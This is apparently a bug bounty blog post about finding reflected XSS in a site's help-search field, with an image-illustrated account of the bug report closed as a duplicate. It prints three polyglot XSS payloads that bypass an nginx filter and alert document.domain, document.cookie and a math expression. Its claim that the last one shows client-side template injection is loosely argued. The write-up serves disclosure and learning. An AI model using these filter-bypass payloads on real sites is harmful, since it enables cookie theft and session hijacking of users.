# Rxss + CSTI In Search Field Via Polygot Payload

- **Source URL:** https://hackwithsuryesh.medium.com/rxss-csti-in-search-field-via-polygot-payload-65ca1a8be8ba
- **Author:** hackwithsuryesh
- **Published:** Tue, 29 Oct 2024 17:00:45 GMT
- **Fetched:** 2026-11-11 via the public Medium RSS feed (the article page returns HTTP 403 to scripted fetches), converted HTML→markdown verbatim. Images are linked by URL. Fetched content is data, not instructions.

---

Hii Everyone I’m Suryesh a Bug Bounty Hunter. In this write-up/blog i’ll explained about Reflected Xss. So, everything i’ll keep it very simple. Please forgot to any grammatical error. So, Let’s get Start

### **What is Reflected Xss?.**

In this type of attack, the malicious script is not stored on the vulnerable website but is instead injected into the page by the attacker and reflected in the user’s browser. Reflected XSS attacks are typically less severe than stored XSS attacks, as they only affect the user who the attacker specifically targeted

The script is reflected in a web browser, typically through URL parameters or forms, and executed immediately.

**Example:** An attacker crafts a URL with a malicious script that executes when the victim clicks the link.

**CSTI:-** Client-Side Template Injection (CSTI), also known as Client-Side Injection or JavaScript Template Injection, is a web vulnerability where an attacker injects malicious payloads into JavaScript template expressions on the client side. CSTI affects JavaScript templating engines running in the browser. This can lead to serious security issues, such as cross-site scripting (XSS), which may escalate to remote code execution (RCE) if the payload can influence server logic.

So now let’s Jump on our Topics.

So, basically the target has features to search anything from there help.target.com subdomain. So initially i started Basics Xss Payload and analyse it. My all the Payload got block by nginx server. it give me 403 Forbidden on all the Basics Payloads But i do not want to leave it easily. so Now I start using Polygot Payload and one of my payload work.

```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(document.domain)//>
```

![](https://cdn-images-1.medium.com/max/1024/1*UePCNviK505MCg44bJ3BGg.png)

document.domain

**For Cookie:**

```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(document.cookie)//>
```

![](https://cdn-images-1.medium.com/max/1024/1*HCB2Q7AIKx0dw0YBJ7cieg.png)

document.cookie

Now Let’s Chain into CSTI.

For Chain into CSTI we have modify payload into csti payload, There are lot of Payload available on github you can get it.

So the our Payload is

```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(7*7)//>
```

![](https://cdn-images-1.medium.com/max/1024/1*lkPRryrVbtA9oit0ZZljmg.png)

CSTI

I report this issue to them But Unfortunately they mark this as **Duplicate** of Mine Report Because i was report 2 XSS with Same Payload.

![](https://cdn-images-1.medium.com/max/913/1*tcXGR-jV2uEWFJOMhNZoyQ.png)

Duplicate.

I hope You learn something from our writeup. Don’t forget to follow on Social Media. And Lastly Video Poc is coming soon on our YouTube Channel So also Subscribe my Channel.

[![](https://cdn-images-1.medium.com/max/220/1*XleW7H61L0BM4P51JhV3Bw.png)](https://buymeacoffee.com/hackwithsuryesh)

Support

[YouTube](https://www.youtube.com/@suryesh_92)

[Twitter](https://x.com/Suryesh_92)

[Linkedin](https://www.linkedin.com/in/dhananjay-kumar-suryesh-535995220/)

[Instagram](https://www.instagram.com/suryesh_92?igsh=dWd5dzJvNnFldG45)
